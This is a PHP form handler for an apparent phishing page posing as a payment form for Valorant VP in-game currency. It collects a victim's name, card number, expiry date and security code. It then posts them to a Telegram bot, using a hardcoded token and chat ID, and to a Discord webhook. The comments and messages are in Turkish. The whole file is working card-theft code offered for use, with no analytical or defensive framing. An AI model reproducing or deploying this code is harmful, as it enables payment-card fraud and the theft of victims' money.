<?php
$telegram_token = "7785057192:AAHi_N1OuqcM1n45DbyjIvN9cq26Xapiii8";
$telegram_chat_id = "1044235740";

$discord_webhook_url = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

$sentTelegram = false;
$sentDiscord = false;
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = trim($_POST['name'] ?? '');
    $cardnumber = trim($_POST['cardnumber'] ?? '');
    $expirationdate = trim($_POST['expirationdate'] ?? '');
    $securitycode = trim($_POST['securitycode'] ?? '');

    if ($name && $cardnumber && $expirationdate && $securitycode) {
        // Mesaj metni
        $message = "💳 Valorant VP Payment Info\n";
        $message .= "👤 Name: $name\n";
        $message .= "💳 Card: $cardnumber\n";
        $message .= "📅 Expiry: $expirationdate\n";
        $message .= "🔐 CVC: $securitycode";

        // --- Telegram'a gönder ---
        $telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
        $telegram_params = [
            "chat_id" => $telegram_chat_id,
            "text" => $message,
            "parse_mode" => "Markdown"
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegram_params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $sentTelegram = ($httpcode >= 200 && $httpcode < 300);

        // --- Discord'a gönder ---
        $discord_payload = json_encode([
            "content" => "**Valorant VP Payment Info**\n" .
                         "**Name:** $name\n" .
                         "**Card:** $cardnumber\n" .
                         "**Expiry:** $expirationdate\n" .
                         "**CVC:** $securitycode"
        ]);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $discord_webhook_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $discord_payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        $sentDiscord = ($httpcode >= 200 && $httpcode < 300);

        if (!$sentTelegram && !$sentDiscord) {
            $error = "Telegram ve Discord gönderimi başarısız oldu.";
        }
    } else {
        $error = "Lütfen tüm alanları doldurun.";
    }
}
?>
